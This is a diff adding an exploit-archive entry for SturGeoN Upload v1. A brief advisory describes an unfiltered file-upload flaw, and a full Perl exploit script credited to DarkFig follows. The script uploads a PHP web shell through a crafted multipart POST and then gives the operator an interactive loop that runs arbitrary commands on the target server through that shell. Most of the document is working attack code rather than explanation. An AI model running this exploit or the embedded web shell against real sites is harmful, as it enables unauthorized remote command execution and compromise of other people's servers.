@@ -1,0 +1,81 @@
+source: http://www.securityfocus.com/bid/18764/info
+
+SturGeoN Upload is prone to an arbitrary file-upload vulnerability. 
+
+An attacker can exploit this vulnerability to upload arbitrary code and execute it in the context of the webserver process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.
+
+#!/usr/bin/perl
+#
+#   VulnScr: SturGeoN Upload v1
+#    Author: Jihad BENABRA
+#  Download: http://rapidshare.de/files/24622338/2012_sturgeon-1.rar.html
+#      WTF?: http://www.comscripts.com/scripts/php.sturgeon-upload.2012.html
+#
+#      Date: Sat July 1 10:04 2006
+#   Credits: Vuln and Xpl by DarkFig (gmdarkfig@gmail.com)
+# Advisorie: No, too short..
+#   Problem: Do not filter the uploaded files
+#   Exploit: Upload a php file (<? $cmd=stripslashes($cmd); system($cmd); ?>), give a shell.
+#       URL: http://acidr00t.free.fr/poc/sturgeonupv1.txt
+#
+# +--------------------------------------------------+
+# | SturGeoN Upload Remote Command Execution Exploit |
+# +--------------------------------------------------+
+#  [localhost]uname -a
+#  Linux ws6 2.6.16-SE-k8 #6 SMP PREEMPT Thu May 11 18:19:55 UTC 2006 i686 GNU/Linux
+#
+#  [localhost]exit
+# +--------------------------------------------------+
+#
+use IO::Socket;
+use LWP::Simple;
+
+header();
+if(!$ARGV[2]){
+  print "| Usage: <host> <path> <filename> -----------------|\n";
+  print "+--------------------------------------------------+\n";
+  exit;
+}
+
+my($host,$path,$file);
+$host = $ARGV[0];
+$path = $ARGV[1];
+$file = $ARGV[2];
+
+my $sock = IO::Socket::INET->new(
+                                 PeerAddr => $host,
+                                 PeerPort => 80,
+                                 Proto => "tcp",
+                                 ) or print "[-]Can't connect to the host\n" and the_end();
+
+print "[+]Connected to the host\n";
+print $sock "POST http://".$host.$path.$file." HTTP/1.1\r\n";
+print $sock "Host: $host\r\n";
+print $sock "Content-Type: multipart/form-data; boundary=---------------------------4827543632391\r\n";
+print $sock "Content-Length: 274\r\n\n";
+print $sock "-----------------------------4827543632391\r\n";
+print $sock "Content-Disposition: form-data; name=\"UpdFILE\"; filename=\"a485f48d65772f784ffec2ce690d0dd5.tmp.php\"\r\n";
+print $sock "Content-Type: application/x-php\r\n\n";
+print $sock "<?\r\n\$cmd=stripslashes(\$cmd);\r\nsystem(\$cmd);\r\n?>\r\n";
+print $sock "-----------------------------4827543632391--\r\n\n";
+close($sock);
+print "[+]File must be uploaded\n";
+
+while(1 ne 2) {
+  print "[$host]";
+  chomp($cmd = <STDIN>);
+  if($cmd eq 'exit') { &the_end; }
+  $req = get('http://'.$host.$path.'load/a485f48d65772f784ffec2ce690d0dd5.tmp.php?cmd='.$cmd) or print "[-]Exploit failed\n";
+  print $req."\n";
+}
+
+sub header {
+  print "\n+--------------------------------------------------+\n";
+  print "| SturGeoN Upload Remote Command Execution Exploit |\n";
+  print "+--------------------------------------------------+\n";
+}
+
+sub the_end {
+  print "+--------------------------------------------------+\n";
+  exit;
+}
